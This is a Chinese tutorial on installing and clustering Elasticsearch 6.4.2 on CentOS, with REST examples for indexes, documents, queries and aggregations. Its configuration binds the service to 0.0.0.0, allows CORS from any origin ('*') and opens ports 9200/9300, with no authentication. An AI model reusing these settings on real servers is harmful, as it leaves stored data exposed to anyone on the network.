<h2 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h2><p>前提：需要依赖java环境（JAVA_HOME）</p>
<h3 id="1-1-1-安装包解压"><a href="#1-1-1-安装包解压" class="headerlink" title="1.1.1 安装包解压"></a>1.1.1 安装包解压</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建/opt/module目录，作为elastic stack的安装目录</span><br><span class="line">mkdir -p /opt/module</span><br><span class="line"></span><br><span class="line">#解压到安装目录</span><br><span class="line">tar -zxvf elasticsearch-6.4.2.tar.gz -C /opt/module</span><br></pre></td></tr></table></figure>

<h3 id="1-1-2-配置elasticsearch"><a href="#1-1-2-配置elasticsearch" class="headerlink" title="1.1.2 配置elasticsearch"></a>1.1.2 配置elasticsearch</h3><p>在config&#x2F;elasticsearch.yml最下面添加如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#能被什么ip访问</span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line">#访问的端口</span><br><span class="line">http.port: 9200</span><br><span class="line">#开启cors</span><br><span class="line">http.cors.enabled: true</span><br><span class="line">#cors所允许的域名</span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br></pre></td></tr></table></figure>

<h3 id="1-1-3-开放防火墙端口"><a href="#1-1-3-开放防火墙端口" class="headerlink" title="1.1.3 开放防火墙端口"></a>1.1.3 开放防火墙端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#elasticsearch端口</span><br><span class="line">firewall-cmd --zone=public --add-port=9200/tcp --permanent</span><br><span class="line"></span><br><span class="line">#elasticsearch集群节点通信端口</span><br><span class="line">firewall-cmd --zone=public --add-port=9300/tcp --permanent</span><br><span class="line"></span><br><span class="line">#重新加载防火墙配置，使添加的端口生效</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h3 id="1-1-4-创建用户并授权"><a href="#1-1-4-创建用户并授权" class="headerlink" title="1.1.4 创建用户并授权"></a>1.1.4 创建用户并授权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建用户组elk</span><br><span class="line">groupadd elk</span><br><span class="line"></span><br><span class="line">#创建用户elk，并加入elk用户组</span><br><span class="line">useradd elk -g elk</span><br><span class="line"></span><br><span class="line">#修改用户elk的密码</span><br><span class="line">passwd elk</span><br><span class="line"></span><br><span class="line">#把elasticsearch-6.4.2目录所属组和属主均改为elk</span><br><span class="line">chown -R elk:elk /opt/module/elasticsearch-6.4.2/</span><br></pre></td></tr></table></figure>

<h3 id="1-1-5-启动elasticsearch"><a href="#1-1-5-启动elasticsearch" class="headerlink" title="1.1.5 启动elasticsearch"></a>1.1.5 启动elasticsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#切换到elk用户，es不能以root用户启动</span><br><span class="line">su elk</span><br><span class="line"></span><br><span class="line">#切换到elasticsearch的bin目录</span><br><span class="line">cd /opt/module/elasticsearch-6.4.2/bin/</span><br><span class="line"></span><br><span class="line">#前台启动，通过ip:port访问</span><br><span class="line">sh elasticsearch</span><br><span class="line"></span><br><span class="line">#后台启动</span><br><span class="line">nohup sh /opt/module/elasticsearch-6.4.2/bin/elasticsearch &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">#停止</span><br><span class="line">jps|grep -i elasticsearch|awk -F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;|xargs kill -9</span><br></pre></td></tr></table></figure>

<h3 id="1-1-6-集群配置"><a href="#1-1-6-集群配置" class="headerlink" title="1.1.6 集群配置"></a>1.1.6 集群配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">################## 此配置与单机的相同(host需改为节点的实际ip) ##################</span><br><span class="line">#当前节点的ip：192.168.199.161、192.168.199.162、192.168.199.163</span><br><span class="line">network.host: 192.168.199.161</span><br><span class="line">#访问的端口</span><br><span class="line">http.port: 9200</span><br><span class="line">#开启cors</span><br><span class="line">http.cors.enabled: true</span><br><span class="line">#cors所允许的域名</span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br><span class="line"></span><br><span class="line">############################ 相对于单机新增的配置 ############################</span><br><span class="line">#集群名称</span><br><span class="line">cluster.name: es-zhifei-cluster</span><br><span class="line">#节点名称，每个节点不能相同（需要修改）</span><br><span class="line">node.name: node1</span><br><span class="line">#是否能成为主节点</span><br><span class="line">node.master: true</span><br><span class="line">#是否为数据节点</span><br><span class="line">node.data: true</span><br><span class="line">#集群间通信端口号(默认9300,如果在同一机器，不能一样)</span><br><span class="line">transport.tcp.port: 9300</span><br><span class="line">#集群所有节点的主机名或ip</span><br><span class="line">discovery.zen.ping.unicast.hosts: [&quot;192.168.199.161:9300&quot;, &quot;192.168.199.162:9300&quot;, &quot;192.168.199.163:9300&quot;]</span><br><span class="line">#成为主节点的最少票数（N/2 + 1），这里使用3台集群，因此这里为2</span><br><span class="line">discovery.zen.minimum_master_nodes: 2</span><br><span class="line">#centos6需要配置system_call_filter</span><br><span class="line">#bootstrap.system_call_filter: false</span><br></pre></td></tr></table></figure>

<h3 id="1-1-7-启动时可能出现的问题"><a href="#1-1-7-启动时可能出现的问题" class="headerlink" title="1.1.7 启动时可能出现的问题"></a>1.1.7 启动时可能出现的问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在启动时可能会出现以下问题（修改完后必须重新登陆linux）：</span><br><span class="line">1.max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]</span><br><span class="line">每个进程最大同时打开文件数太小，可通过下面2个命令查看当前数量：</span><br><span class="line">ulimit -Hn</span><br><span class="line">ulimit -Sn</span><br><span class="line">修改/etc/security/limits.conf文件，增加配置，用户退出后重新登录生效：</span><br><span class="line">*    soft  nofile 65536</span><br><span class="line">*    hard  nofile 65536</span><br><span class="line"></span><br><span class="line">2.max number of threads [3795] for user [elk] is too low, increase to at least [4096]</span><br><span class="line">问题同上，最大线程个数太低。Centos7修改配置文件/etc/security/limits.conf，增加配置：</span><br><span class="line">*    soft  nproc  4096</span><br><span class="line">*    hard  nproc  4096</span><br><span class="line">centos6需要再加多以下配置:</span><br><span class="line">vi /etc/security/limits.d/90-nproc.conf		#修改为4096</span><br><span class="line">*     soft  nproc   4096</span><br><span class="line">修改完后通过问题ulimit -a查看</span><br><span class="line"></span><br><span class="line">3.max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</span><br><span class="line">修改/etc/sysctl.conf文件，增加配置vm.max_map_count=262144，执行命令sysctl -p生效</span><br><span class="line"></span><br><span class="line">4.如果使用centos6，可能出现：system call filters failed to install;需要修改elasticsearch.yml，添加：</span><br><span class="line">bootstrap.system_call_filter: false     #Memory配置项下添加（如果有这一项）</span><br></pre></td></tr></table></figure>

<h3 id="1-1-8-自启动"><a href="#1-1-8-自启动" class="headerlink" title="1.1.8 自启动"></a>1.1.8 自启动</h3><ol>
<li>切换到init.d目录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/init.d</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建elasticsearch文件，内容如下（前几行注释不能省，否则报错：chkconfig不支持该服务）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#chkconfig: 345 63 37</span><br><span class="line">#description: elasticsearch auto-startup</span><br><span class="line">#processname: elasticsearch-6.4.2</span><br><span class="line"></span><br><span class="line">#配置java路径</span><br><span class="line">export JAVA_HOME=/usr/local/jdk1.8.0_201</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line">#配置es路径</span><br><span class="line">export ES_HOME=/opt/module/elasticsearch-6.4.2</span><br><span class="line">#配置es的pid文件名称</span><br><span class="line">export ES_PID=elasticsearch.pid</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">        start)</span><br><span class="line">                su - elk&lt;&lt;!</span><br><span class="line">                cd $ES_HOME</span><br><span class="line">		if [ ! -e $ES_PID ] || [ $(jps|grep -i elasticsearch|grep `cat $ES_HOME/$ES_PID`|wc -l) -eq 0 ];then </span><br><span class="line">		    ./bin/elasticsearch -d -p $ES_PID</span><br><span class="line">		fi</span><br><span class="line">		exit</span><br><span class="line">!</span><br><span class="line">		echo &quot;elasticsearch is started.&quot;</span><br><span class="line">                ;;</span><br><span class="line">        stop)</span><br><span class="line">                kill -9 `cat $ES_HOME/$ES_PID`</span><br><span class="line">                echo &quot;elasticsearch is stopped.&quot;</span><br><span class="line">                ;;</span><br><span class="line">        restart)</span><br><span class="line">                kill -9 `cat $ES_HOME/$ES_PID`</span><br><span class="line">                echo &quot;elasticsearch is stopped.&quot;</span><br><span class="line">		sleep 1</span><br><span class="line">                su - elk&lt;&lt;!</span><br><span class="line">                cd $ES_HOME</span><br><span class="line">                if [ ! -e $ES_PID ] || [ $(jps|grep -i elasticsearch|grep `cat $ES_HOME/$ES_PID`|wc -l) -eq 0 ];then</span><br><span class="line">                    ./bin/elasticsearch -d -p $ES_PID</span><br><span class="line">                fi</span><br><span class="line">		exit</span><br><span class="line">!</span><br><span class="line">                echo &quot;elasticsearch is started.&quot;</span><br><span class="line">        	;;</span><br><span class="line">    	*)</span><br><span class="line">        	echo &quot;start|stop|restart&quot;</span><br><span class="line">        	;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>添加权限</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod a+x elasticsearch</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>添加系统服务并设置自启动</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --add elasticsearch　　　　【添加系统服务】</span><br><span class="line">chkconfig --del elasticsearch　　　　【删除系统服务】</span><br><span class="line"></span><br><span class="line">service elasticsearch start　　　　　【启动】</span><br><span class="line">service elasticsearch stop　　　　　 【停止】</span><br><span class="line">service elasticsearch restart　　   【重启】</span><br><span class="line">systemctl start/stop/restart elasticsearch		【启动/停止/重启】等同于上述3个</span><br><span class="line"></span><br><span class="line">chkconfig elasticsearch on　　　　　　【开启自启动】</span><br><span class="line">chkconfig elasticsearch off　　   　 【关闭自启动】</span><br><span class="line">systemctl enable/disable elasticsearch		【开启自启动/关闭自启动】等同于上述两个</span><br></pre></td></tr></table></figure>

<h2 id="1-2-基本使用"><a href="#1-2-基本使用" class="headerlink" title="1.2 基本使用"></a>1.2 基本使用</h2><h3 id="1-2-1-状态信息查询"><a href="#1-2-1-状态信息查询" class="headerlink" title="1.2.1 状态信息查询"></a>1.2.1 状态信息查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看所有索引，参数v均表示以友好的形式展示状态信息</span><br><span class="line">GET 	/_cat/indices?v</span><br><span class="line"></span><br><span class="line">#查看所有节点状态</span><br><span class="line">GET		/_cat/nodes?v</span><br><span class="line"></span><br><span class="line">#查看当前节点状态</span><br><span class="line">GET		/_cat/health?v</span><br><span class="line"></span><br><span class="line">#查看集群状态</span><br><span class="line">GET		/_cluster/health</span><br></pre></td></tr></table></figure>

<h3 id="1-2-2-操作索引"><a href="#1-2-2-操作索引" class="headerlink" title="1.2.2 操作索引"></a>1.2.2 操作索引</h3><h4 id="1-2-2-1-创建索引（非结构化索引）"><a href="#1-2-2-1-创建索引（非结构化索引）" class="headerlink" title="1.2.2.1 创建索引（非结构化索引）"></a>1.2.2.1 创建索引（非结构化索引）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建索引user，用法/&lt;索引名称&gt;</span><br><span class="line">PUT		/user</span><br></pre></td></tr></table></figure>

<h4 id="1-2-2-2-创建索引（结构化索引）"><a href="#1-2-2-2-创建索引（结构化索引）" class="headerlink" title="1.2.2.2 创建索引（结构化索引）"></a>1.2.2.2 创建索引（结构化索引）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建索引people，用法/&lt;索引名称&gt;，这里的&quot;index&quot;:false表示不能作为查询字段</span><br><span class="line">方法一：</span><br><span class="line">PUT		/people</span><br><span class="line">&#123;</span><br><span class="line">	&quot;settings&quot;:&#123;</span><br><span class="line">		&quot;index&quot;:&#123;</span><br><span class="line">			&quot;number_of_shards&quot;:&quot;2&quot;,</span><br><span class="line">			&quot;number_of_replicas&quot;:&quot;0&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;mappings&quot;:&#123;</span><br><span class="line">		&quot;person&quot;:&#123;</span><br><span class="line">			&quot;properties&quot;:&#123;</span><br><span class="line">				&quot;name&quot;:&#123;</span><br><span class="line">					&quot;type&quot;:&quot;text&quot;,</span><br><span class="line">					&quot;index&quot;:true</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;age&quot;:&#123;</span><br><span class="line">					&quot;type&quot;:&quot;integer&quot;,</span><br><span class="line">					&quot;index&quot;:false</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;mail&quot;:&#123;</span><br><span class="line">					&quot;type&quot;:&quot;keyword&quot;,</span><br><span class="line">					&quot;index&quot;:true</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;hobby&quot;:&#123;</span><br><span class="line">					&quot;type&quot;:&quot;text&quot;,</span><br><span class="line">					&quot;index&quot;:true</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">方法二(es7.+版本才能使用)：</span><br><span class="line">#先创建非结构化索引people</span><br><span class="line">PUT		/people</span><br><span class="line">#再指定其mapping</span><br><span class="line">PUT		/people/_mapping</span><br><span class="line">&quot;properties&quot;:&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;type&quot;:&quot;text&quot;,</span><br><span class="line">        &quot;index&quot;:true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;age&quot;:&#123;</span><br><span class="line">        &quot;type&quot;:&quot;integer&quot;,</span><br><span class="line">        &quot;index&quot;:false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;mail&quot;:&#123;</span><br><span class="line">        &quot;type&quot;:&quot;keyword&quot;,</span><br><span class="line">        &quot;index&quot;:true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hobby&quot;:&#123;</span><br><span class="line">        &quot;type&quot;:&quot;text&quot;,</span><br><span class="line">        &quot;index&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-2-3-查看索引"><a href="#1-2-2-3-查看索引" class="headerlink" title="1.2.2.3 查看索引"></a>1.2.2.3 查看索引</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看索引people</span><br><span class="line">GET		/people</span><br></pre></td></tr></table></figure>

<h4 id="1-2-2-4-查看索引的映射关系"><a href="#1-2-2-4-查看索引的映射关系" class="headerlink" title="1.2.2.4 查看索引的映射关系"></a>1.2.2.4 查看索引的映射关系</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看索引people的映射关系</span><br><span class="line">GET		/people/_mapping</span><br></pre></td></tr></table></figure>

<h4 id="1-2-2-5-删除索引"><a href="#1-2-2-5-删除索引" class="headerlink" title="1.2.2.5 删除索引"></a>1.2.2.5 删除索引</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#删除索引people</span><br><span class="line">DELETE	/people</span><br></pre></td></tr></table></figure>

<h3 id="1-2-3-操作数据"><a href="#1-2-3-操作数据" class="headerlink" title="1.2.3 操作数据"></a>1.2.3 操作数据</h3><h4 id="1-2-3-1-新增数据"><a href="#1-2-3-1-新增数据" class="headerlink" title="1.2.3.1 新增数据"></a>1.2.3.1 新增数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#新增一条记录，不指定文档id</span><br><span class="line">POST	/user/_doc</span><br><span class="line">&#123;</span><br><span class="line">	&quot;id&quot;:1,</span><br><span class="line">	&quot;username&quot;:&quot;张三&quot;,</span><br><span class="line">	&quot;gender&quot;:&quot;male&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#新增一条记录，指定文档_id为1</span><br><span class="line">POST	/user/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">	&quot;id&quot;:1,</span><br><span class="line">	&quot;username&quot;:&quot;张三&quot;,</span><br><span class="line">	&quot;gender&quot;:&quot;male&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-2-更新数据"><a href="#1-2-3-2-更新数据" class="headerlink" title="1.2.3.2 更新数据"></a>1.2.3.2 更新数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#全量数据更新，这里更新文档id为1的数据</span><br><span class="line">PUT		/user/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">	&quot;id&quot;:1,</span><br><span class="line">	&quot;username&quot;:&quot;小红&quot;,</span><br><span class="line">	&quot;gender&quot;:&quot;female&quot;,</span><br><span class="line">	&quot;age&quot;: 21</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#局部数据更新，这里更新文档id为1的数据，(es7.+版本还可以使用/user/_update/1)</span><br><span class="line">POST	/user/_doc/1/_update</span><br><span class="line">&#123;</span><br><span class="line">	&quot;doc&quot;: &#123;</span><br><span class="line">		&quot;username&quot;: &quot;小花&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#局部数据更新，使用脚本来局部更新，ctx._source引用的是当前源文档，这里更新age = age + 3</span><br><span class="line">POST	/user/_doc/1/_update</span><br><span class="line">&#123;</span><br><span class="line">    &quot;script&quot;: &quot;ctx._source.age += 3&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-3-查询数据"><a href="#1-2-3-3-查询数据" class="headerlink" title="1.2.3.3 查询数据"></a>1.2.3.3 查询数据</h4><h5 id="批量插入测试数据"><a href="#批量插入测试数据" class="headerlink" title="批量插入测试数据"></a>批量插入测试数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST	/user/_doc/_bulk?pretty</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;1&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:1, &quot;username&quot;:&quot;张三&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;hobbies&quot;:[&quot;basketball&quot;,&quot;football&quot;,&quot;swimming&quot;],&quot;age&quot;:20&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;2&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:2, &quot;username&quot;:&quot;李四&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;hobbies&quot;:[&quot;basketball&quot;,&quot;running&quot;,&quot;tennis&quot;],&quot;age&quot;:25&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;3&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:3, &quot;username&quot;:&quot;李小明&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;hobbies&quot;:[&quot;football&quot;,&quot;running&quot;,&quot;tennis&quot;],&quot;age&quot;:30&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;4&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:4, &quot;username&quot;:&quot;广东李四&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;hobbies&quot;:[&quot;swimming&quot;,&quot;tennis&quot;],&quot;age&quot;:35&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="1）简单查询"><a href="#1）简单查询" class="headerlink" title="1）简单查询"></a>1）简单查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询索引user中文档id为1的数据</span><br><span class="line">GET		/user/_doc/1</span><br><span class="line"></span><br><span class="line">#查询索引user中文档id为1的数据(不返回元素据，且只返回其中的id,username字段)</span><br><span class="line">GET		/user/_doc/1/_source?pretty&amp;_source=id,username</span><br><span class="line"></span><br><span class="line">#q=*表示查询对象为指定索引下的所有文档，以id降序排序，返回10条记录，pretty为优雅的显示结果（直接写查询条件在url上的查询方式不推荐使用）</span><br><span class="line">GET		/user/_search?q=*&amp;sort=id:desc&amp;size=10&amp;pretty</span><br><span class="line"></span><br><span class="line">#查询所有，默认&quot;from&quot;:0，&quot;size&quot;:10，返回10条数据，可通过这两个参数实现分页查询，并以id降序排序</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;from&quot;:0,</span><br><span class="line">    &quot;size&quot;:10,</span><br><span class="line">    &quot;sort&quot;: [</span><br><span class="line">		&#123;&quot;id&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#查询username包含&quot;李四&quot;的记录，假设username类型不为keyword，也就是会被分词，则这里的含义是：将&quot;李四&quot;进行分词后，再去查询包含&quot;李四&quot;被分词后的关键字的数据。假设查询条件的&quot;李四&quot;替换成&quot;aaa bbb&quot;，表示查询username包含aaa或者bbb的记录，因为&quot;aaa bbb&quot;被分词后为aaa和bbb，指定_source表示结果里只返回的字段列表</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;username&quot;: &quot;李四&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;_source&quot;:[&quot;id&quot;, &quot;username&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#查询username包含&quot;李四&quot;的记录，match_phrase与match不同的是，match_phrase表示指定字段包含字符串&quot;李四&quot;</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_phrase&quot;: &#123;</span><br><span class="line">            &quot;username&quot;: &quot;李四&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#高亮显示</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_phrase&quot;: &#123;</span><br><span class="line">            &quot;username&quot;: &quot;李四&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;highlight&quot;: &#123;</span><br><span class="line">    	&quot;fields&quot;: &#123;</span><br><span class="line">    		&quot;username&quot;: &#123;&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#查询包含某字段的记录</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">	&quot;query&quot;:&#123;</span><br><span class="line">		&quot;exists&quot;:&#123;</span><br><span class="line">			&quot;field&quot;:&quot;age&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2）term和terms精确匹配"><a href="#2）term和terms精确匹配" class="headerlink" title="2）term和terms精确匹配"></a>2）term和terms精确匹配</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意：term和terms的查询条件均不参与分词</span><br><span class="line"></span><br><span class="line">#精确匹配username为&quot;李四&quot;的记录，.keyword表示使用属性的keyword模式</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">            &quot;username.keyword&quot;: &quot;李四&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#精确匹配username为&quot;李四&quot;和&quot;张三&quot;的记录</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;terms&quot;: &#123;</span><br><span class="line">            &quot;username.keyword&quot;: [&quot;李四&quot;, &quot;张三&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3）bool查询"><a href="#3）bool查询" class="headerlink" title="3）bool查询"></a>3）bool查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#逻辑与或非查询，bool must=&gt;and，bool should=&gt;or, bool must_not=&gt;not，例子：查询hobbies包含swimming或者包含football的记录。如果逻辑与或非的查询条件只有一个的时候，可以去掉查询条件&quot;bool&quot;:&#123;&quot;should&quot;:[&#123;xxx:xxx&#125;]&#125;外层的[]</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;should&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;hobbies&quot;: &quot;swimming&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;hobbies&quot;: &quot;football&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4）filter过滤"><a href="#4）filter过滤" class="headerlink" title="4）filter过滤"></a>4）filter过滤</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#范围查询，查询username包含&quot;李&quot;且age&gt;=20且age&lt;=30，gte(greater than equal)、gt(greater than)、lte(less than equal)、lt(less than)</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;must&quot;: &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;username&quot;: &quot;李&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;filter&quot;: &#123;</span><br><span class="line">                &quot;range&quot;: &#123;</span><br><span class="line">                    &quot;age&quot;: &#123;</span><br><span class="line">                        &quot;gte&quot;:20,</span><br><span class="line">                        &quot;lte&quot;:30</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#filter过滤与查询的区别：查询会计算匹配度，并计算出评分_score，较为消耗性能；过滤会进行缓存，精确匹配</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;: &#123;</span><br><span class="line">                &quot;term&quot;: &#123;</span><br><span class="line">                    &quot;username.keyword&quot;: &quot;张三&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="5）分组聚合查询"><a href="#5）分组聚合查询" class="headerlink" title="5）分组聚合查询"></a>5）分组聚合查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#聚合分组，此案例聚合分组了3次，分别是先按照id&gt;=1且id&lt;3 和 id&gt;=3且id&lt;5进行分组，再按照gender进行分组，最后求平均年龄，这里的.keyword作用把text类型的gender当作keyword类型看待，text类型不能参与terms分组聚合。此外，除了range、terms、avg，还有stats、min、max等函数</span><br><span class="line">GET		/user/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;:0,</span><br><span class="line">    &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;range_id&quot;: &#123;</span><br><span class="line">            &quot;range&quot;: &#123;</span><br><span class="line">                &quot;field&quot;: &quot;id&quot;,</span><br><span class="line">                &quot;ranges&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;from&quot;: 1,</span><br><span class="line">                        &quot;to&quot;: 3</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;from&quot;: 3,</span><br><span class="line">                        &quot;to&quot;: 5</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;aggs&quot;: &#123;</span><br><span class="line">                &quot;group_by_age&quot;: &#123;</span><br><span class="line">                    &quot;terms&quot;: &#123;</span><br><span class="line">                        &quot;field&quot;: &quot;gender.keyword&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;aggs&quot;: &#123;</span><br><span class="line">                        &quot;average_age&quot;: &#123;</span><br><span class="line">                            &quot;avg&quot;: &#123;</span><br><span class="line">                                &quot;field&quot;: &quot;age&quot;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

